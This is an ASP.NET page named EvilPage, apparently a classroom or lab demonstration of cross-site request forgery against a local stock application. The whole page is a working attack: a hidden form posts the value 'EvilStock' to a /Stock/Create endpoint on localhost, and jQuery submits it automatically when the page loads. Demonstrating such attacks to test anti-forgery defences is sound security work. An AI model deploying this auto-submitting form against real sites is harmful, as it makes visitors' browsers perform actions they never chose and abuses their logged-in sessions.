<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="EvilPage.aspx.cs" Inherits="EvilSite.EvilPage" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>

        <script src="Scripts/jquery-3.4.1.intellisense.js"></script>
        <script src="Scripts/jquery-3.4.1.js"></script>
        <script src="Scripts/jquery-3.4.1.min.js"></script>        
        <script src="Scripts/jquery-3.4.1.slim.js"></script>
        <script src="Scripts/jquery-3.4.1.slim.min.js"></script>
        <script src="Scripts/jquery.validate-vsdoc.js"></script>
        <script src="Scripts/jquery.validate.js"></script>
        <script src="Scripts/jquery.validate.min.js"></script>
        <script src="Scripts/jquery.validate.unobtrusive.js"></script>
        <script src="Scripts/jquery.validate.unobtrusive.min.js"></script>
        <script src="Scripts/modernizr-2.8.3.js"></script>

    </title>
</head>
<body>
    <form id="form1" action="https://localhost:44315/Stock/Create" method="post">
        <input type="hidden" name="hiddenField" value="EvilStock"/>
        <div>
        </div>
    </form>
     <script>
         $(document).ready(function () {
             // Select the form element using jQuery and invoke the submit() method
             $("form").submit();
         });
         </script>
</body>
</html>
